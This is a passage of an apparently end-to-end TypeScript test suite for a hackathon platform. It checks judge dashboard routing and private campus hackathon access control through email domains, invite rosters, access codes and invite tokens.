    assert.ok(
      judgeRes.text.includes("Evaluation Portal") || judgeRes.text.includes("Judges Command Center"),
      "Must render the judges dashboard"
    );

    const adminRes = await fetchHtml("/judges", ADMIN_TOKEN);
    assert.equal(adminRes.status, 200);
  });

  test("AM.8. Spelling alias /judge redirects seamlessly to /judges", async () => {
    const res = await fetch(`http://localhost:3000/judge`, {
      redirect: "manual",
      headers: { Cookie: `neon-auth.session_token=${JUDGE_TOKEN}` },
    });
    assert.ok([307, 308, 302, 303].includes(res.status), "Must redirect from /judge");
    const location = res.headers.get("location") || "";
    assert.ok(location.includes("/judges"), "Redirect location must point to /judges");
  });

  test("AM.9. Organizer querying GET /api/organizer/judges receives their assigned judging panel", async () => {
    const res = await api("/api/organizer/judges", {
      method: "GET",
      token: ORGANIZER_TOKEN,
    });
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.data.judges), "Must return judges array");
    const emails = res.data.judges.map((j: any) => j.email);
    assert.ok(emails.includes(createdJudgeEmail), "Invited judge must appear in organizer's panel");
  });

  test("AM.10. UserMenu component links Organizers to /organizer and Judges to /judges", async () => {
    const userMenuSource = await fs.readFile(
      path.resolve(process.cwd(), "src/components/navigation/user-menu.tsx"),
      "utf-8"
    );
    assert.ok(
      userMenuSource.includes('href="/organizer"') &&
      userMenuSource.includes('href="/organizer/judges"'),
      "UserMenu must link organizer to /organizer and /organizer/judges"
    );
    assert.ok(
      userMenuSource.includes('href="/judges"'),
      "UserMenu must link judge to /judges"
    );
  });
});

describe("Suite AN: Private Hackathons & Campus Student Roster RBAC", () => {
  let privateHackathonId = "";
  let privateHackathonSlug = "";
  let privateInviteToken = "";

  const MIT_STUDENT_EMAIL = `alice_mit_${Date.now()}@mit.edu`;
  const WHITELIST_EMAIL = `bob_roster_${Date.now()}@customdomain.io`;
  const OUTSIDER_EMAIL = `charlie_outsider_${Date.now()}@otherdomain.com`;
  const PASSCODE_EMAIL = `dave_code_${Date.now()}@somewhere.com`;
  const LINK_EMAIL = `eve_link_${Date.now()}@anywhere.com`;

  const MIT_STUDENT_TOKEN = "e2e_mit_student_tok_" + Date.now();
  const WHITELIST_TOKEN = "e2e_whitelist_student_tok_" + Date.now();
  const OUTSIDER_TOKEN = "e2e_outsider_tok_" + Date.now();
  const PASSCODE_TOKEN = "e2e_passcode_tok_" + Date.now();
  const LINK_TOKEN = "e2e_link_tok_" + Date.now();

  let mitStudentId = "";
  let whitelistStudentId = "";
  let outsiderId = "";
  let passcodeUserId = "";
  let linkUserId = "";

  before(async () => {
    mitStudentId = await createActor("user", "Alice MIT", MIT_STUDENT_EMAIL);
    whitelistStudentId = await createActor("user", "Bob Whitelist", WHITELIST_EMAIL);
    outsiderId = await createActor("user", "Charlie Outsider", OUTSIDER_EMAIL);
    passcodeUserId = await createActor("user", "Dave Passcode", PASSCODE_EMAIL);
    linkUserId = await createActor("user", "Eve Link", LINK_EMAIL);

    const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000);
    await sql`
      INSERT INTO neon_auth.session (id, "userId", token, "expiresAt", "createdAt", "updatedAt")
      VALUES
        (${crypto.randomUUID()}::uuid, ${mitStudentId}::uuid, ${MIT_STUDENT_TOKEN}, ${expiresAt}, NOW(), NOW()),
        (${crypto.randomUUID()}::uuid, ${whitelistStudentId}::uuid, ${WHITELIST_TOKEN}, ${expiresAt}, NOW(), NOW()),
        (${crypto.randomUUID()}::uuid, ${outsiderId}::uuid, ${OUTSIDER_TOKEN}, ${expiresAt}, NOW(), NOW()),
        (${crypto.randomUUID()}::uuid, ${passcodeUserId}::uuid, ${PASSCODE_TOKEN}, ${expiresAt}, NOW(), NOW()),
        (${crypto.randomUUID()}::uuid, ${linkUserId}::uuid, ${LINK_TOKEN}, ${expiresAt}, NOW(), NOW())
      ON CONFLICT (token) DO NOTHING;
    `;
  });

  after(async () => {
    if (privateHackathonId) {
      await sql`DELETE FROM public.hackathon_registrations WHERE hackathon_id = ${privateHackathonId}::uuid`;
      await sql`DELETE FROM public.hackathons WHERE id = ${privateHackathonId}::uuid`;
    }
    await sql`DELETE FROM neon_auth.session WHERE token IN (${MIT_STUDENT_TOKEN}, ${WHITELIST_TOKEN}, ${OUTSIDER_TOKEN}, ${PASSCODE_TOKEN}, ${LINK_TOKEN})`;
    if (mitStudentId && whitelistStudentId && outsiderId && passcodeUserId && linkUserId) {
      await sql`DELETE FROM public.users WHERE id IN (${mitStudentId}, ${whitelistStudentId}, ${outsiderId}, ${passcodeUserId}, ${linkUserId})`;
      await sql`DELETE FROM neon_auth.user WHERE id IN (${mitStudentId}::uuid, ${whitelistStudentId}::uuid, ${outsiderId}::uuid, ${passcodeUserId}::uuid, ${linkUserId}::uuid)`;
    }
  });

  test("AN.1. Organizer can create Private Hackathon with access code, allowed domains, and invited emails", async () => {
    privateHackathonSlug = `e2e-private-hackathon-${Date.now()}`;
    const payload = {
      title: "MIT & IITB Exclusive Campus AI Sprint",
      slug: privateHackathonSlug,
      tagline: "Exclusive campus hackathon for university developers and whitelisted cohorts",
      description: "Private university hackathon protected by passcode, domain filters, and invite tokens.",
      format: "online",
      location: "Campus Intranet",
      prize_pool: "$10,000",
      currency: "USD",
      prizes: [{ rank: 1, title: "1st Place", amount: "$10,000" }],
      tags: ["AI", "Campus", "Students"],
      rules: "1. Must be registered student\n2. Must follow academic code of conduct",
      start_date: new Date(Date.now() + 86400000).toISOString(),
      end_date: new Date(Date.now() + 7 * 86400000).toISOString(),
      submission_deadline: new Date(Date.now() + 6 * 86400000).toISOString(),
      max_team_size: 4,
      organizer_name: "MIT AI Student Society",
      status: "published",
      is_private: true,
      access_code: "CAMPUS-2026",
      allowed_email_domains: ["mit.edu", "iitb.ac.in"],
      invited_emails: [WHITELIST_EMAIL],
    };

    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ORGANIZER_TOKEN,
      body: payload,
    });

    assert.equal(res.status, 201, "Hackathon creation should return 201");
    assert.equal(res.data.hackathon.is_private, true, "is_private must be true");
    assert.equal(res.data.hackathon.access_code, "CAMPUS-2026", "access_code must match");
    assert.ok(
      Array.isArray(res.data.hackathon.allowed_email_domains) &&
      res.data.hackathon.allowed_email_domains.includes("mit.edu"),
      "allowed_email_domains must contain mit.edu"
    );
    assert.ok(
      Array.isArray(res.data.hackathon.invited_emails) &&
      res.data.hackathon.invited_emails.includes(WHITELIST_EMAIL.toLowerCase()),
      "invited_emails must contain whitelist email"
    );
    assert.ok(
      typeof res.data.hackathon.invite_token === "string" && res.data.hackathon.invite_token.length > 5,
      "invite_token must be auto-generated"
    );

    privateHackathonId = res.data.hackathon.id;
    privateInviteToken = res.data.hackathon.invite_token;
  });

  test("AN.2. Public builder without credentials receives 403 Forbidden on registration", async () => {
    const res = await api(`/api/hackathons/${privateHackathonSlug}/register`, {
      method: "POST",
      token: OUTSIDER_TOKEN,
      body: { participation_type: "solo" },
    });

    assert.equal(res.status, 403, "Outsider without credentials must be rejected with 403");
    assert.ok(
      res.data.error && res.data.error.toLowerCase().includes("restricted"),
      "Error must explain private campus restriction"
    );
  });

  test("AN.3. Student with matching institutional email domain (@mit.edu) can register seamlessly", async () => {
    const res = await api(`/api/hackathons/${privateHackathonSlug}/register`, {
      method: "POST",
      token: MIT_STUDENT_TOKEN,
      body: { participation_type: "solo" },
    });

    assert.equal(res.status, 200, "Student with approved institutional email must register successfully");
    assert.equal(res.data.registered, true);
  });

  test("AN.4. Student on pre-approved invited email roster can register seamlessly", async () => {
    const res = await api(`/api/hackathons/${privateHackathonSlug}/register`, {
      method: "POST",
      token: WHITELIST_TOKEN,
      body: { participation_type: "looking_for_team" },
    });

    assert.equal(res.status, 200, "Whitelisted student email must register successfully");
    assert.equal(res.data.registered, true);
  });

  test("AN.5. Builder with valid access code can register", async () => {
    // Test case-insensitive passcode matching (lowercase 'campus-2026')
    const res = await api(`/api/hackathons/${privateHackathonSlug}/register`, {
      method: "POST",
      token: PASSCODE_TOKEN,
      body: {
        access_code: "campus-2026",
        participation_type: "looking_for_team",
      },
    });

    assert.equal(res.status, 200, "Builder providing correct passcode must be registered");
    assert.equal(res.data.registered, true);
  });

  test("AN.6. Builder with invalid access code receives 403 Forbidden", async () => {
    const res = await api(`/api/hackathons/${privateHackathonSlug}/register`, {
      method: "POST",
      token: OUTSIDER_TOKEN,
      body: {
        access_code: "WRONG-PASSCODE",
        participation_type: "solo",
      },
    });

    assert.equal(res.status, 403, "Invalid passcode must be rejected with 403");
  });

  test("AN.7. Student with secret invite token can register via body or URL token", async () => {
    const res = await api(`/api/hackathons/${privateHackathonSlug}/register`, {
      method: "POST",
      token: LINK_TOKEN,
      body: {
        invite_token: privateInviteToken,
        participation_type: "solo",
      },
    });

    assert.equal(res.status, 200, "Student using secret invite token must register successfully");
    assert.equal(res.data.registered, true);
  });

  test("AN.8. Team invitation to ineligible outsider is rejected with 403 Forbidden", async () => {
    const res = await api("/api/team-invites", {
      method: "POST",
      token: MIT_STUDENT_TOKEN,
      body: {
        hackathon_slug: privateHackathonSlug,
        receiver_email: "unauthorized_outsider@randomcorp.com",
        role: "Frontend Dev",
        team_name: "MIT Alpha",
      },
    });

    assert.equal(res.status, 403, "Teaming with ineligible outsider must return 403 Forbidden");
    assert.ok(
      res.data.error.includes("private college hackathon") || res.data.error.includes("restricted"),
      "Error must inform about private campus restrictions"
    );
  });

  test("AN.9. Access verification endpoint GET /api/hackathons/[slug]/verify-access validates credentials", async () => {
    // 1. Valid code
    const validCodeRes = await api(
      `/api/hackathons/${privateHackathonSlug}/verify-access?code=CAMPUS-2026`,
      { token: OUTSIDER_TOKEN }
    );
    assert.equal(validCodeRes.status, 200);
    assert.equal(validCodeRes.data.allowed, true);
    assert.equal(validCodeRes.data.reason, "access_code");

    // 2. Invalid code
    const invalidCodeRes = await api(
      `/api/hackathons/${privateHackathonSlug}/verify-access?code=INCORRECT`,
      { token: OUTSIDER_TOKEN }
    );
    assert.equal(invalidCodeRes.status, 200);
    assert.equal(invalidCodeRes.data.allowed, false);

    // 3. Valid invite token
    const tokenRes = await api(
      `/api/hackathons/${privateHackathonSlug}/verify-access?invite=${privateInviteToken}`,
      { token: OUTSIDER_TOKEN }
    );
    assert.equal(tokenRes.status, 200);
    assert.equal(tokenRes.data.allowed, true);
    assert.equal(tokenRes.data.reason, "invite_token");
  });

  test("AN.10. Organizer can inspect student roster and whitelist bulk student emails via /api/organizer/hackathons/[id]/students", async () => {
    // Inspect roster
    const rosterRes = await api(`/api/organizer/hackathons/${privateHackathonId}/students`, {
      method: "GET",
      token: ORGANIZER_TOKEN,
    });

    assert.equal(rosterRes.status, 200);
    assert.equal(rosterRes.data.is_private, true);
    assert.ok(Array.isArray(rosterRes.data.registered_students), "Must return registered students list");
    assert.ok(rosterRes.data.registered_count >= 4, "Must show at least 4 registered campus students");

    // Bulk add student emails
    const newStudentEmail = `cohort_student_${Date.now()}@alumni.mit.edu`;
    const addRes = await api(`/api/organizer/hackathons/${privateHackathonId}/students`, {
      method: "POST",
      token: ORGANIZER_TOKEN,
      body: {
        action: "add_emails",
        emails: [newStudentEmail, "dean_special@mit.edu"],
      },
    });

    assert.equal(addRes.status, 200);
    assert.ok(
      addRes.data.invited_emails.includes(newStudentEmail.toLowerCase()),
      "Updated whitelist must contain newly added student email"
    );
  });

  test("AN.11. Organizer can regenerate secret invite link token", async () => {
    const regenRes = await api(`/api/organizer/hackathons/${privateHackathonId}/students`, {
      method: "POST",
      token: ORGANIZER_TOKEN,
      body: { action: "regenerate_token" },
    });

    assert.equal(regenRes.status, 200);
    assert.ok(regenRes.data.invite_token, "Must return fresh invite token");
    assert.notEqual(regenRes.data.invite_token, privateInviteToken, "New token must differ from old token");
  });

  test("AN.12. Hackathon detail page (/hackathons/[slug]) and listing render Private Campus indicators", async () => {
    const detailRes = await fetchHtml(`/hackathons/${privateHackathonSlug}`, OUTSIDER_TOKEN);
    assert.equal(detailRes.status, 200);
    assert.ok(
      detailRes.text.includes("Private Campus Event") || detailRes.text.includes("Private / Campus Challenge"),
      "Detail page must render Private Campus indicators"
    );

    const browseRes = await fetchHtml("/hackathons", OUTSIDER_TOKEN);
    assert.equal(browseRes.status, 200);
    assert.ok(
      browseRes.text.includes("Private") || browseRes.text.includes("Campus"),
      "Public hackathons browse list must show Private/Campus tag"
    );
  });
});




















